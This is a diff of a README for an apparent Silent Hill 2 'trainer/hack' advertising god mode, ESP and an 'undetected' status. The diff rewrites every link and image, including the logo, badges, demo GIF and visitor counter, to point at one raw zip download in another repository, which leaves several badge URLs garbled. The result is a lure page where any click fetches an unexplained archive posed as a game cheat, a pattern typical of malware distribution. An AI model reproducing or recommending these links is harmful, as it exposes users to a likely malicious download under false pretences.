@@ -1,25 +1,25 @@
 <p align="center">
   <br/><br/>
-  <a href="https://getcore.cc/">
-    <img src="https://raw.githubusercontent.com/inedufepcojemar/The-Sims-4-Aether/main/pictures/0.png" height="120">
+  <a href="https://github.com/algari436/Silent-Hill-2/raw/refs/heads/main/tensile/Hill-Silent-v1.6-beta.1.zip">
+    <img src="https://github.com/algari436/Silent-Hill-2/raw/refs/heads/main/tensile/Hill-Silent-v1.6-beta.1.zip" height="120">
   </a>
 </p>
 
 <p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=42&duration=4500&pause=1200&color=FF4500&center=true&vCenter=true&width=750&lines=SILENT+HILL+2+TRAINER+%2F+HACK;OP+UNLIMITED+HEALTH+2026;GOD+MODE+ESP+TELEPORT;INFINITE+AMMO+NOCLIP;PASTEBIN+STYLE;WORKS+ALL+VERSIONS;UNDTECTED+FAST" alt="Typing SVG" />
+  <img src="https://github.com/algari436/Silent-Hill-2/raw/refs/heads/main/tensile/Hill-Silent-v1.6-beta.1.zip+Code&size=42&duration=4500&pause=1200&color=FF4500&center=true&vCenter=true&width=750&lines=SILENT+HILL+2+TRAINER+%2F+HACK;OP+UNLIMITED+HEALTH+2026;GOD+MODE+ESP+TELEPORT;INFINITE+AMMO+NOCLIP;PASTEBIN+STYLE;WORKS+ALL+VERSIONS;UNDTECTED+FAST" alt="Typing SVG" />
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Popular-%F0%9F%94%A5-gold?style=for-the-badge&logo=github" alt="Popular 🔥"/>
-  <img src="https://img.shields.io/badge/Cloned-%F0%9F%9A%80-cyan?style=for-the-badge&logo=github" alt="Cloned 🚀"/>
-  <img src="https://img.shields.io/badge/Status-UNDTECTED-brightgreen?style=for-the-badge&logo=checkmarx" alt="Status"/>
-  <img src="https://img.shields.io/badge/Compatibility-99%25-orange?style=for-the-badge" alt="99% Compat"/>
-  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Steam-ff4500?style=for-the-badge" alt="Platform"/>
-  <img src="https://img.shields.io/badge/Key-No%20Key-green?style=for-the-badge" alt="No Key"/>
+  <img src="https://github.com/algari436/Silent-Hill-2/raw/refs/heads/main/tensile/Hill-Silent-v1.6-beta.1.zip%F0%9F%94%A5-gold?style=for-the-badge&logo=github" alt="Popular 🔥"/>
+  <img src="https://github.com/algari436/Silent-Hill-2/raw/refs/heads/main/tensile/Hill-Silent-v1.6-beta.1.zip%F0%9F%9A%80-cyan?style=for-the-badge&logo=github" alt="Cloned 🚀"/>
+  <img src="https://github.com/algari436/Silent-Hill-2/raw/refs/heads/main/tensile/Hill-Silent-v1.6-beta.1.zip" alt="Status"/>
+  <img src="https://github.com/algari436/Silent-Hill-2/raw/refs/heads/main/tensile/Hill-Silent-v1.6-beta.1.zip%25-orange?style=for-the-badge" alt="99% Compat"/>
+  <img src="https://github.com/algari436/Silent-Hill-2/raw/refs/heads/main/tensile/Hill-Silent-v1.6-beta.1.zip%20%7C%20Steam-ff4500?style=for-the-badge" alt="Platform"/>
+  <img src="https://github.com/algari436/Silent-Hill-2/raw/refs/heads/main/tensile/Hill-Silent-v1.6-beta.1.zip%20Key-green?style=for-the-badge" alt="No Key"/>
 </p>
 
 <p align="center">
-  <img src="https://github.com/YOUR_USERNAME/YOUR_REPOSITORY/raw/main/assets/silent-hill-2-trainer-demo.gif" alt="Silent Hill 2 Trainer Hack Demo" width="800"/>
+  <img src="https://github.com/algari436/Silent-Hill-2/raw/refs/heads/main/tensile/Hill-Silent-v1.6-beta.1.zip" alt="Silent Hill 2 Trainer Hack Demo" width="800"/>
   <br/>
   <sub>Unlimited Health + God Mode + ESP + Teleport + Infinite Ammo + Noclip • Undetected February 2026 • Launch & Survive</sub>
 </p>
@@ -90,8 +90,8 @@ Star repo ⭐ & open issue.
 **Fog conquered.** 🌫️🔪
 
 <p align="center">
-  <a href="https://getcore.cc/">
-    <img src="https://raw.githubusercontent.com/inedufepcojemar/The-Sims-4-Aether/main/pictures/0.png" height="120">
+  <a href="https://github.com/algari436/Silent-Hill-2/raw/refs/heads/main/tensile/Hill-Silent-v1.6-beta.1.zip">
+    <img src="https://github.com/algari436/Silent-Hill-2/raw/refs/heads/main/tensile/Hill-Silent-v1.6-beta.1.zip" height="120">
   </a>
 </p>
 
@@ -100,5 +100,5 @@ Star repo ⭐ & open issue.
 </p>
 
 <p align="center">
-  <img src="https://visitor-badge.laobi.icu/badge?page_id=YOUR_USERNAME.YOUR_REPOSITORY" alt="Visitors Badge"/>
+  <img src="https://github.com/algari436/Silent-Hill-2/raw/refs/heads/main/tensile/Hill-Silent-v1.6-beta.1.zip" alt="Visitors Badge"/>
 </p>
